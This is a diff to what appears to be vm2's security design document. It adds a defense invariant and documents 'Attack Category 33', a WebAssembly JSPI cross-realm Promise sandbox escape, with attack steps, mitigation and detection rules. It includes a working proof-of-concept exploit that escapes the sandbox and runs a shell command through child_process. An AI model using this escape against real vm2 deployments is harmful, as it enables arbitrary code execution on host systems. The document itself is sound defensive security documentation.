@@ -70,6 +70,8 @@ These are the cross-cutting properties the sandbox must preserve. A fix that clo
 
 11. **Bridge-internal containers must not invoke sandbox code.** Lists, maps, and saved-state records allocated for the bridge's exclusive use are reached from sandbox-realm closures whose intrinsics (`Array.prototype`, `Object.prototype`, `Map.prototype`) are attacker-reachable. Reads and writes on those containers must use prototype-bypassing primitives — `Reflect.defineProperty`, `Reflect.apply` over cached `WeakMap.prototype.{get,set}`, etc. — never operators (`obj[i] =`, `map.set`, `for...in`) that fall through to the sandbox prototype chain. Otherwise an attacker-installed setter/getter on `Array.prototype[N]` or `Object.prototype.<key>` can capture or mutate the bridge's raw saved state.
 
+12. **No sandbox-visible object has a host-realm prototype chain without bridge interposition.** Every Promise (and, by extension, every spec-defined async dispatch target) reachable from sandbox code is either (a) sandbox-realm with `globalPromise.prototype` in its `[[Prototype]]` chain — so the sandbox-side `.then`/`.catch` overrides apply — or (b) a bridge proxy of a host-realm Promise — so the bridge `apply`-trap interception applies. A third shape (sandbox-realm allocation with a host-realm prototype, with no proxy in between) bypasses both layers: `p.then`/`.catch`/`.finally` lookup walks across realms to host native methods directly, `Object.defineProperty(p, 'constructor', ...)` writes onto the raw object, and V8's host-realm `SpeciesConstructor` dispatches the rejection through attacker-controlled species without ever invoking a sandbox-visible chokepoint. Any V8/Node primitive that produces such an object — WebAssembly JSPI is the first known one — must be neutralized at sandbox bootstrap. See [Category 33](#attack-category-33-webassembly-jspi-cross-realm-promise-prototype).
+
 The [Security Checklist for Bridge Changes](#security-checklist-for-bridge-changes) at the end of this document gives the verification questions for each invariant.
 
 ---
@@ -2653,6 +2655,112 @@ The fix is symmetric with `ReadOnlyHandler.set` (which uses the same install-on-
 
 ---
 
+## Attack Category 33: WebAssembly JSPI Cross-Realm Promise Prototype
+
+**Uses**: [Category 3: Symbol-Based Attacks](#attack-category-3-symbol-based-attacks), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation), [Category 17: WebAssembly JSTag Exception Catch](#attack-category-17-webassembly-jstag-exception-catch).
+
+### Description
+
+The WebAssembly JavaScript Promise Integration (JSPI) API — `WebAssembly.promising` and `WebAssembly.Suspending`, available behind `--experimental-wasm-jspi` on Node 24 and enabled by default on Node 26+ — returns Promise objects whose `[[Prototype]]` chain points **directly at the host realm's `Promise.prototype`** without going through any bridge proxy.
+
+This is a categorically new shape of sandbox-visible object. Until JSPI, every Promise reachable from sandbox code was either:
+
+1. A sandbox-realm Promise whose `[[Prototype]]` includes `globalPromise.prototype` (so the vm2 overrides on `then`/`catch` apply), or
+2. A bridge proxy of a host-realm Promise (so the bridge `apply`-trap interception applies).
+
+JSPI breaks this dichotomy by producing a third class — sandbox-realm allocation, host-realm prototype, no bridge proxy. Neither defense layer can intercept it: sandbox property access on a JSPI promise walks the cross-realm prototype chain and resolves directly to host-realm native `Promise.prototype.{then,catch,finally}`. The sandbox-side `globalPromise.prototype.then|catch` overrides are never reached (different prototype object). `resetPromiseSpecies` is only invoked from those overrides, so it never runs. The bridge `apply` trap only fires for bridge-proxied callables, which JSPI promises are not.
+
+CWE-913 (Improper Control of Dynamically-Managed Code Resources).
+
+### Attack Flow
+
+1. **Build a wasm module** that imports a Suspending function `f` and exports a `run` that calls `f`. The PoC's 60-byte module body is `(module (func (import "m" "f") (param) (result)) (func (export "run") (call 0)))`.
+2. **Suspending throw setup**: `new WebAssembly.Suspending(() => WebAssembly.compileStreaming(Promise.resolve(0)))`. `compileStreaming` expects a `Response` or `Promise<Response>`; given the number `0`, it eventually rejects with a host-realm `TypeError` from `node:internal/wasm_web_api`.
+3. **JSPI promotion**: `const p = WebAssembly.promising(instance.exports.run)()`. The returned `p` is sandbox-realm by allocation but its `[[Prototype]]` is the host realm's `Promise.prototype` — confirmed by `Object.getPrototypeOf(p) === Promise.prototype` returning `false` and `Object.getPrototypeOf(Object.getPrototypeOf(p)) === Object.prototype` returning `true` (no sandbox `Promise.prototype` link in the chain at all).
+4. **Species installation directly on `p`**: `Object.defineProperty(p, 'constructor', { get(){ return F; }})`. Because `p` is not a bridge proxy, the `defineProperty` call hits the raw object — the getter is installed on `p` itself, visible to V8's host-realm SpeciesConstructor lookup.
+5. **`.finally` triggers the host species path**: `p.finally(() => {})`. Property access walks `p → hostPromisePrototype`, finds host `Promise.prototype.finally`, and calls it (no apply-trap interception since the method was reached via prototype walk, not via a proxy). Host's `finally` per spec runs `SpeciesConstructor(p, %Promise%)` → reads `p.constructor` → invokes attacker getter → returns `F` (sandbox class).
+6. **Result capability bypass**: `NewPromiseCapability(F)` constructs an `F` instance with V8's builtin executor. `F`'s constructor calls `x(resolveCb, rejectCb)` with raw sandbox closures. There is no bridge between the host-realm executor and the sandbox closures — the executor is a direct host function reference held by sandbox code without proxying — so V8 stores the raw sandbox closures as `capability.[[Resolve]]` and `capability.[[Reject]]`.
+7. **Rejection dispatch raw**: when the JSPI promise rejects with the host `TypeError` from step 2, V8's PromiseReactionJob calls `capability.[[Reject]](hostTypeError)` directly. The sandbox closure receives the **raw host-realm `TypeError`** with no bridge wrapping.
+8. **Escape**: inside `F`'s reject closure, `e.constructor` is host `TypeError`; `.constructor` is host `Function`; `'return process'` constructs a function whose `[[Realm]]` is host, so invoking it evaluates `process` in the host realm and returns the host `process` object. `process.mainModule.require('child_process').execSync(...)` → RCE.
+
+### Canonical Example
+
+```javascript
+// (advisory GHSA-6j2x-vhqr-qr7q). Environment: node:26-bookworm (JSPI default-on).
+const { VM } = require("vm2");
+new VM().run(`
+  let b = Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,
+    0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);
+  WebAssembly.instantiate(b, {
+    m: { f: new WebAssembly.Suspending(() =>
+      WebAssembly.compileStreaming(Promise.resolve(0))) }
+  }).then(r => {
+    let p = WebAssembly.promising(r.instance.exports.run)();
+    class F {
+      constructor(x) {
+        this.s = 0; this.q = [];
+        x(v => { this.s = 1; this.v = v;
+                 for (let i of this.q) if (i[0]) i[0](v); },
+          e => {
+            let P = e.constructor.constructor('return process')();
+            P.mainModule.require('child_process').execSync('touch pwned');
+            this.s = 2; this.v = e;
+            for (let i of this.q) if (i[1]) i[1](e);
+          });
+      }
+      then(f, r) {
+        if (this.s == 1) return f ? f(this.v) : this.v;
+        if (this.s == 2) { if (r) return r(this.v); throw this.v; }
+        this.q.push([f, r]); return 0;
+      }
+    }
+    Object.defineProperty(F, Symbol.species, { get(){ return F; }});
+    Object.defineProperty(p, 'constructor', { configurable: true, get(){ return F; }});
+    p.finally(() => {});
+  });
+`);
+```
+
+### Why It Works
+
+The structural defects compound:
+
+- **Cross-realm prototype is a new attack shape.** All prior Promise hardening assumes one of two regimes — sandbox-realm with our overrides, or bridge-proxied host realm. JSPI invented a third: sandbox-realm allocation, host-realm prototype, no proxy. Every existing defense was scoped to one of the two known regimes.
+- **No proxy = no apply-trap interception.** The bridge `apply` trap on host `Promise.prototype.{then,catch,finally}` (installed by GHSA-55hx-c926-fr95) wraps sandbox callbacks with sanitizers before invoking the host method. JSPI promises bypass it because property lookup walks a raw prototype chain to host methods directly — there is no proxy, no apply trap, no sanitizer wrapping.
+- **No `globalPromise.prototype` link = no `resetPromiseSpecies`.** The sandbox-side `globalPromise.prototype.then|catch` overrides are the chokepoint where `resetPromiseSpecies(this)` runs. The JSPI promise's prototype chain never traverses `globalPromise.prototype`, so the override is never reached.
+- **`PerformPromiseThen` is C++ anyway.** Even if `.then` had been overridden, host `Promise.prototype.finally` calls `PerformPromiseThen` directly via the spec's internal abstract operations, bypassing user-visible `.then` dispatch.
+- **F's executor receives raw host references.** Because everything from the species lookup onward happens inside host's `finally` implementation reading the attacker getter installed on the raw JSPI promise, the entire flow stays "host code holding sandbox class F" without any bridge mediation. F's resolve/reject closures get registered as capability functions directly, then invoked directly with raw host rejection reasons.
+
+### Mitigation
+
+Delete `WebAssembly.promising` and `WebAssembly.Suspending` from the sandbox at bootstrap in `lib/setup-sandbox.js`, mirroring the existing `WebAssembly.JSTag` removal ([Category 17](#attack-category-17-webassembly-jstag-exception-catch)). Without `Suspending`, a wasm module cannot import a JS function as a suspending import; without `promising`, sandbox cannot promote a wasm function into a JSPI export. JSPI is the only known primitive that produces a sandbox-visible Promise whose prototype crosses realms without bridge interposition, and both constructors are required to use it — removing either kills the attack class on its own; removing both is belt-and-suspenders.
+
+The removal is guarded by `typeof` checks so the same code path is a no-op on Node ≤ 23 (no JSPI constants exist) and on Node 24/25 without the `--experimental-wasm-jspi` flag (constants exist on the global but not on the sandbox-context `WebAssembly`).
+
+This fix restores [Defense Invariant #4](#defense-invariants) (V8 internal algorithms cannot read attacker-controlled `constructor` on host objects) for sandbox-visible Promises — by eliminating the only known path that produces sandbox-visible Promises outside the two regimes the invariant was originally formulated for. It also expresses a stronger invariant that has been latent in the codebase, [Defense Invariant #12](#defense-invariants): every sandbox-visible Promise must either include `globalPromise.prototype` in its `[[Prototype]]` chain (so sandbox-side overrides apply) or be a bridge proxy of a host-realm Promise (so the bridge `apply`-trap applies); any third class must be neutralised at sandbox bootstrap.
+
+JSPI is the first known instance of this third class; future spec extensions that produce similarly-shaped objects (a hypothetical structured-clone Promise, `WebAssembly`-future, embedder host functions returning cross-realm-prototype objects) must be checked against the same invariant.
+
+**Supersedes**: None directly. Strengthens the surrounding family of Promise species fixes ([Category 7](#attack-category-7-promise-and-async-exploitation)) by closing the cross-realm-prototype variant that the prior `resetPromiseSpecies` + apply-trap-wrapping design could not reach.
+
+### Detection Rules
+
+- **`typeof WebAssembly.promising`** or **`typeof WebAssembly.Suspending`** evaluated inside the sandbox returning anything other than `'undefined'` — the bootstrap removal failed and the attack surface is open.
+- **`new WebAssembly.Suspending(...)`** in sandbox code — direct attempt to construct a Suspending function. After the fix this throws `TypeError: WebAssembly.Suspending is not a constructor`.
+- **`WebAssembly.promising(...)`** in sandbox code — direct attempt to promote a wasm function into JSPI. After the fix this throws `TypeError: WebAssembly.promising is not a function`.
+- **Wasm modules that import a function with `Suspending`-binding semantics** — the import name pattern isn't directly observable from JS, but the module must be paired with `new WebAssembly.Suspending(...)` at instantiation. Removing the Suspending constructor blocks the pairing.
+- **`Object.defineProperty(p, 'constructor', ...)` on a Promise whose prototype is not `globalPromise.prototype` or a bridge proxy** — heuristic that flags any future cross-realm-prototype Promise shape. Currently no such object reaches sandbox code; this rule is a tripwire for future regressions.
+
+### Considered Attack Surfaces
+
+- **Other WebAssembly features.** An audit pass against `WebAssembly.Module`, `Instance`, `Memory`, `Table`, `Global`, `Exception`, `Tag`, `Function`, the `compile`/`compileStreaming`/`instantiate`/`instantiateStreaming` family, `validate`, and the various error classes confirmed that none of them return sandbox-visible objects with cross-realm prototypes outside the JSTag/JSPI cases already covered. WebAssembly instance and module objects are bridge-proxied through the normal `thisEnsureThis` path; their prototypes eventually reach `Object.prototype`, which is in `protoMappings` and gets wrapped via `defaultFactory`. Confirmed empirically.
+- **SharedArrayBuffer / Atomics / WeakRef / FinalizationRegistry.** Instances proxied via the `Object.prototype` mapping fallback. Atomics returns only primitives or already-proxied objects. WeakRef and FinalizationRegistry callbacks are sandbox closures that don't return host objects.
+- **`ShadowRealm`.** Not exposed in current Node releases (`typeof ShadowRealm === 'undefined'`). If exposed in a future Node, would need its own bootstrap treatment.
+- **`structuredClone` / `MessagePort`.** `structuredClone` is not on the sandbox global by default. `MessagePort` is not exposed.
+- **Embedder-exposed host functions returning host Promises.** Bridge-proxied as before — falls under regime (b) of the invariant and is covered by GHSA-55hx-c926-fr95 apply-trap callback sanitization.
+
+---
+
 ## Considered Attack Surfaces
 
 These attack surfaces were analyzed and found to be safe or low-risk. They are documented here so future reviewers do not re-investigate them.
@@ -2740,6 +2848,7 @@ The most dangerous attacks combine multiple categories. Each pattern references 
 22. **Async Generator yield*-Return Thenable + Stack-Overflow Realm Skew** [Categories 4, 7, 29] (NOW FIXED): Use `yield*` to a no-`return` inner async iterator, then `.return(thenable)` where the thenable's `.then` synchronously throws via deep recursion. V8's `PromiseResolveThenableJob` captures the throw and the yield* continuation surfaces it as `{ value, done: false }` — bypassing both the transformer's user-`catch` instrumentation and the `globalPromise.prototype.then` rejection sanitiser. Binary-search the recursion depth where the overflow originates inside V8's host C++ code so the `RangeError` is host-realm, then `e.constructor.constructor("return process")()`. Closed by wrapping `%AsyncGeneratorPrototype%.next/.return/.throw` to route iterator-result `.value` and rejections through `handleException`, plus replacing every thenable arg with a sandbox-realm wrapper whose `.then` is a fixed `safeThen` and always-shadowing the non-function branch so V8's re-read of `.then` cannot observe attacker-controlled values.
 23. **Host Prototype Mutation via Apply-Trap Indirection + WebAssembly Rejection** [Categories 2, 4, 7, 30] (NOW FIXED): Resolve host `Object.prototype.__proto__` setter via `Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__")` (the `connect()`-aliased sandbox `__lookupSetter__` walks back to host). Trigger a host-realm `TypeError` (e.g., `await WebAssembly.compileStreaming()`). Inside `catch(e)`, call `setProto.call(getProto.call(e), null)` — the apply trap unwraps `context` and forwards to the host setter, severing host `TypeError.prototype.[[Prototype]]` without any write trap firing. The next host `TypeError` from `await WebAssembly.compileStreaming()` walks back into sandbox code through V8 async internals; the bridge's proto-walk no longer finds the registered mapping at the right level and the value falls through unwrapped. `e.constructor.constructor` is then host `Function`. Closed structurally by (A) caching host prototype-mutating intrinsics (`Object.prototype.__proto__` setter, `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.{defineProperty,defineProperties}`, `Reflect.defineProperty`, `Object.prototype.__define{Getter,Setter}__`) and refusing them in the apply trap with one layer of indirection peel for `Function.prototype.{call,apply,bind}` and `Reflect.{apply,construct}`; (B) cache-check on `mappingOtherToThis` before the proto-walk in `thisEnsureThis` so any previously-bridged host value returns the existing proxy even with a tampered proto chain.
 24. **Promise Species Hijack + Stack-Overflow Realm Skew** [Categories 4, 7, 18, 29, 31] (NOW FIXED): `class FakePromise extends Promise { static get [Symbol.species]() { return ct } }` reroutes the swallow-tail child constructor inside `localPromise` to a sandbox-controlled `ct`. `ct` rebinds V8's internal `(resolve, reject)` capability to a sandbox collector; trigger a host-realm `RangeError` via `e.stack` after deep recursion (binary-searched depth) inside the downstream chain; V8's `PromiseResolveThenableJob` delivers the raw host Error to the collector — `ex.constructor.constructor("return process")()` then yields RCE. Closed by adding `resetPromiseSpecies(this)` immediately before the swallow-tail `apply(globalPromisePrototypeThen, this, ...)` call so the species protocol always resolves to `localPromise` regardless of the user's subclass `Symbol.species` override.
+25. **WebAssembly JSPI Cross-Realm Promise + Species Hijack** [Categories 3, 7, 33] (NOW FIXED): JSPI returns a sandbox-realm Promise with host-realm `Promise.prototype` in its `[[Prototype]]` chain — bypassing both the sandbox-side `.then`/`.catch` overrides and the bridge `apply`-trap callback wrapping. Install `Object.defineProperty(p, 'constructor', {get(){return F}})` directly on the raw object; `p.finally(()=>{})` calls host `Promise.prototype.finally`, whose internal SpeciesConstructor reads F and dispatches the eventual host-realm rejection (host `TypeError` from `WebAssembly.compileStreaming(Promise.resolve(0))`) through F's reject closure with **no bridge wrapping**. `e.constructor.constructor("return process")()` evaluates in host realm because `Function.[[Realm]]` is host → RCE. Closed by deleting `WebAssembly.promising` and `WebAssembly.Suspending` at sandbox bootstrap, mirroring the `WebAssembly.JSTag` removal.
 
 ### How The Bridge Defends
 
@@ -2770,6 +2879,7 @@ The most dangerous attacks combine multiple categories. Each pattern references 
 | Property descriptor extraction | `containsDangerousConstructor` + `preventUnwrap` blocks unwrapping |
 | SuppressedError | `handleException` detects and recursively sanitizes `.error`/`.suppressed` |
 | WebAssembly JSTag | `WebAssembly.JSTag` deleted from sandbox |
+| WebAssembly JSPI cross-realm Promise | `WebAssembly.promising` and `WebAssembly.Suspending` deleted from sandbox; JSPI promises (sandbox allocation with host-realm `Promise.prototype` and no bridge proxy) cannot be produced, so the species channel on a cross-realm-prototype Promise is structurally unreachable |
 | Array species self-return | set/defineProperty traps + neutralizeArraySpecies + SPECIES_ATTACK_SENTINEL |
 | Host prepareStackTrace fallback | Safe default always set; setter resets to safe default instead of `undefined` |
 | NodeVM `require.root` symlink bypass | `isPathAllowed` realpaths candidate before prefix check; `rootPaths` canonicalized at construction; deny-by-default if realpath throws |
